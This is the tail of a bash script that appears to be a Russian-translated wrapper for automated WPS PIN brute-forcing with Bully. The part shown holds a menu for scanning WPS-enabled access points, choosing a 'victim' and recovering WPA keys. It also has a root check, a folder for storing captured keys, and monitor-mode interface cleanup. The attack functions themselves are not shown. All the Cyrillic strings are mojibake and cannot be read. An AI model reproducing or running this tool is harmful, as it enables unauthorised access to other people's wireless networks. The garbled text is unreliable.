echo "$WIFI –∫–∞—Ä—Ç–∞ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –∏–∑–≤–ª–µ—á–µ–Ω–∞!"
airmon-ng stop $WIFI >/dev/null
fi
  echo ""
echo "         –ñ–¥–∏—Ç–µ."
sleep 2
clear
 exit

}

menu() {
# Welcome
echo " #########################################################################################"
echo " #                                                                                       #"
echo " #    ~ –°–∫—Ä–∏–ø—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –∞—Ç–∞–∫–∏ –Ω–∞ WPS —Å –ø–æ–º–æ—â—å—é Bully –Ω–∞–ø–∏—Å–∞–Ω @cristi_28            #"
echo " #    ~ –ü–µ—Ä–µ–≤–æ–¥ –Ω–∞ —Ä—É—Å—Å–∫–∏–π: 5maks5 [ forum.antichat.ru/member.php?u=136564 ]             #"
echo " #    ~ –†–∞–∑–¥–µ–ª –±–µ—Å–ø—Ä–æ–≤–æ–¥–Ω—ã–µ —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–∏: [ forum.antichat.ru/forum113.html ]              #"
echo " #    ~ –°–∞–π—Ç –∞–≤—Ç–æ—Ä–∞: [ http://lampiweb.com ]; –ü–æ–¥–¥–µ—Ä–∂–∫–∞: Kali,WifiSlax                   #"
echo " #    ~ –í–µ—Ä—Å–∏—è: 2.1 (–ø–µ—Ä–µ–≤–æ–¥ 19.07.14) –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏: BullyWPS $VERSION                         #"
echo " #                                                                                       #"
echo " #                                                                                       #"
echo " #########################################################################################"
sleep 1
echo "---------------------------------------"
if [ "$InfoAP" = "ON" ]; then
  echo "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:"
  echo ""
  echo "              ESSID = $ESSID"
  echo "              –ö–∞–Ω–∞–ª = $CHANEL"
  echo "         MAC AP = $BSSID"
  fi
  if [ "$ShowWPA" = "ON" ]; then
  echo "          WPA Key = $WPA_KEY"
  fi
  echo "---------------------------------------"
echo ""
echo " 1) –ü–æ–∏—Å–∫ —Ç–æ—á–µ–∫ —Å –≤–∫–ª—é—á–µ–Ω–Ω—ã–º WPS"
echo ""
echo " 2) –í—ã–±—Ä–∞—Ç—å –¥—Ä—É–≥—É—é –∂–µ—Ä—Ç–≤—É"
echo ""
echo " 3) –ü–æ–¥–±–æ—Ä WPA —Å Bully"
echo ""
echo " 4) –ü–æ–¥–±–æ—Ä WPA –±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä–∞ " 
echo ""
echo " 5) –î–æ–±–∞–≤–∏—Ç—å –∫–æ–º–º–∞–Ω–¥—ã Bully ( –ø—Ä: -N -Z , –∏—Ç–¥. ) "
echo ""
echo " 6) –î–æ–±–∞–≤–∏—Ç—å –ø–µ—Ä–≤—ã–µ 4 —Ü–∏—Ñ—Ä—ã + xxxx"
echo ""
echo " 7) –û–±–Ω–æ–≤–∏—Ç—å Bully"
echo ""
echo " 8) –û–±–Ω–æ–≤–∏—Ç—å MACChanger"
echo ""
echo " 0) –í—ã—Ö–æ–¥"
echo ""
read -p " #> " CHOISE
echo ""
case $CHOISE in
  1 ) WashScan;;
  2 ) SeleccionarObjetivo;;
  3 ) ObtenerWPA_con_pin_o_no;;
  4 ) ObtenerWPA;;
  5 ) optional_functions;;
  6 ) Primer_pin;;
  7 ) bully_update;;
  8 ) macchanger_update;;
  0 ) DESMONTAR_tarj_y_salir;;
  * ) echo "–ù–µ–≤–µ—Ä–Ω–æ –≤—ã–±—Ä–∞–Ω–Ω—ã–π –ø—É–Ω–∫—Ç!"; menu;;
esac
}

# User check
if [ "$(whoami)" != "root" ]; then
 echo -e '\e[1;31m


    ¬°¬°¬° –ó–∞–ø—É—Å–∫ –≤–æ–∑–º–æ–∂–µ–Ω —Ç–æ–ª—å–∫–æ –æ—Ç root !!!

        –ü—Ä–æ–≤–µ—Ä–∫–∞: sudo $0

\e[0m' 

 exit 1
fi

# Create directories if they do not exist 
if [ ! -d $TMP ]; then mkdir -p $TMP; else rm -rf $TMP/*; fi
if [ ! -d $KEYS ]; then mkdir -p $KEYS; fi
if [ -d $HOME/Desktop/Wireless-Keys ]; then
  if [ ! -d $HOME/Desktop/Wireless-Keys/$SCRIPT-keys ]; then
    ln -s $KEYS $HOME/Desktop/Wireless-Keys/$SCRIPT-keys
  fi
fi

# Eliminating interfaces in monitor
interfaces=$(ifconfig|awk '/^mon/ {print $1}')
if [ "$interfaces" != "" ]; then
  for monx in $interfaces; do
    airmon-ng stop $monx up >/dev/null 2>&1
  done
fi

menu
